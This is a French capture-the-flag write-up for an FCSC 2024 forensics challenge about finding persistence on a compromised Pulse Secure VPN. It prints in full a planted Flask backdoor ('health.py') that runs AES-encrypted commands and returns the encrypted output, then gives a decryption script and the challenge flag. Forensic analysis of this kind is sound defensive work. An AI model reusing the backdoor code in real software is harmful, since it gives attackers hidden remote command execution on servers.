
https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-3/

## Description

Vous venez d’être embauché en tant que Responsable de la Sécurité des Systèmes d’Information (RSSI) d’une entreprise stratégique.

En arrivant à votre bureau le premier jour, vous vous rendez compte que votre prédécesseur vous a laissé une clé USB avec une note dessus : `VPN compromis (intégrité). Version 22.3R1 b1647`.

---

Vous avez réussi à déchiffrer l’archive. Il semblerait qu’il y ait dans cette archive une autre archive, qui contient le résultat du script de vérification d’intégrité de l’équipement.

À l’aide de cette dernière archive et des journaux, vous cherchez maintenant les traces d’une persistance déposée et utilisée par l’attaquant.

Cette épreuve a été découpée en cinq parties :

- [Horreur, malheur 1/5 - Archive chiffrée](https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-1/).
- [Horreur, malheur 2/5 - Accès initial](https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-2/).
- [Horreur, malheur 3/5 - Simple persistance](https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-3/).
- [Horreur, malheur 4/5 - Pas si simple persistance](https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-4/).
- [Horreur, malheur 5/5 - Un peu de CTI](https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-5/).
## Write Up

Bon bon, cet exercice 3 est un cumul du 1 et du 2, rebelotte pour déchiffrer l'encrypted, d'où l'intérêt des WU !!

Un aperçu du contenu de l'archive qui était dans archive.encrypted :
![[Pasted image 20250212091723.png]]

On check le "configencrypt", script qui a permis de créer l'archive :![[Pasted image 20250212091747.png]]

On check "cav-0.1-py3.6.egg", en faisant un cat on se rend compte que c'est pas comme ça qu'on fait ahah, en checkant sur google je tombe là dessus :
![[Pasted image 20250212091950.png]]

On sait jamais :
![[Pasted image 20250212092201.png]]
Mais non dommage rien trouvé, par contre on n'est pas bredouille avec juste "flag" :
![[Pasted image 20250212092312.png]]

On va dans "health.py" :
```python
#
# Copyright (c) 2018 by Pulse Secure, LLC. All rights reserved
#
import base64
import subprocess
import zlib
import simplejson as json
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from flask import request
from flask_restful import Resource


class Health(Resource):
    """
    Handles requests that are coming for client to post the application data.
    """

    def get(self):
        try:
            with open("/data/flag.txt", "r") as handle:
                dskey = handle.read().replace("\n", "")
            data = request.args.get("cmd")
            if data:
                aes = AES.new(dskey.encode(), AES.MODE_ECB)
                cmd = zlib.decompress(aes.decrypt(base64.b64decode(data)))
                result = subprocess.getoutput(cmd)
                if not isinstance(result, bytes): result = str(result).encode()
                result = base64.b64encode(aes.encrypt(pad(zlib.compress(result), 32))).decode()        
                return result, 200
        except Exception as e:
            return str(e), 501
```

Bon on voit qu'en requêtant l'api sur l'argument cmd, on peut envoyer de l'information qui est ensuite chiffré. 

Comme on est dans l'arborescence /api/ressources/health.py, on va essayer de taper dans du health?cmd= dans les logs de l'exo 2 :
![[Pasted image 20250212093050.png]]
Merci Lechat pour la commande sed, j'avais la flemme de faire du regex :)

Bon par contre maintenant, faut tout décoder, on va se baser sur le script de chiffrement :

```python
from Crypto.Cipher import AES

from base64 import b64decode

from Crypto.Util.Padding import unpad

from urllib.parse import unquote

import zlib

  
  

info_health = [

    "DjrB3j2wy3YJHqXccjkWidUBniQPmhTkHeiA59kIzfA%3D",

    "K/a6JKeclFNFwnqrFW/6ENBiq0BnskUVoqBf4zn3vyQ%3D",

    "/ppF2z0iUCf0EHGFPBpFW6pWT4v/neJ6wP6dERUuBM/6CAV2hl/l4o7KqS7TvTZAWDVxqTd6EansrCTOAnAwdQ%3D%3D",

    "Lmrbj2rb7SmCkLLIeBfUxTA2pkFQex/RjqoV2WSBr0EyxihrKLvkqPKO3I7KV1bhm8Y61VzkIj3tyLKLgfCdlA%3D%3D",

    "yPfHKFiBi6MxfKlndP99J4eco1zxfKUhriwlanMWKE3NhhHtYkSOrj4QZhvf6u17fJ%2B74TvmsMdtYH6pnvcNZOq3JRu2hdv2Za51x82UYXG1WpYtAgCa42dOx/deHzAlZNwM7VvCZckPLfDeBGZyLHX/XP4spz4lpfau9mZZ%2B/o%3D",

    "E1Wi18Bo5mPNTp/CaB5o018KdRfH2yOnexhwSEuxKWBx7%2Byv4YdHT3ASGAL67ozaoZeUzaId88ImfFvaPeSr6XtPvRqgrLJPl7oH2GHafzEPPplWHDPQQUfxsYQjkbhT",

    "7JPshdVsmVSiQWcRNKLjY1FkPBh91d2K3SUK7HrBcEJu/XbfMG9gY/pTNtVhfVS7RXpWHjLOtW01JKfmiX/hOJQ8QbfXl2htqcppn%2BXeiWHpCWr%2ByyabDservMnHxrocU4uIzWNXHef5VNVClGgV4JCjjI1lofHyrGtBD%2B0nZc8%3D",

    "WzAd4Ok8kSOF8e1eS6f8rdGE4sH5Ql8injexw36evBw/mHk617VRAtzEhjXwOZyR/tlQ20sgz%2BJxmwQdxnJwNg%3D%3D",

    "G9QtDIGXyoCA6tZC6DtLz89k5FDdQNe2TfjZ18hdPbM%3D",

    "QV2ImqgrjrL7%2BtofpO12S9bqgDCRHYXGJwaOIihb%2BNI%3D",

]

  

dskey = "50c53be3eece1dd551bebffe0dd5535c" #Flag.txt du chall 1

  

for info in info_health:

    # On se base sur celui là : b64encode(aes.encrypt(pad(zlib.compress(result))), et on va dans l"autre sens

    aes = AES.new(dskey.encode(), AES.MODE_ECB)

    info_decrypt = aes.decrypt(b64decode(unquote(info)))

    result = zlib.decompress(unpad(info_decrypt,32))

    print(result)
```

Et hop :
![[Pasted image 20250212094536.png]]

Le flag est donc **FCSC{6cd63919125687a10d32c4c8dd87a5d0c8815409}**.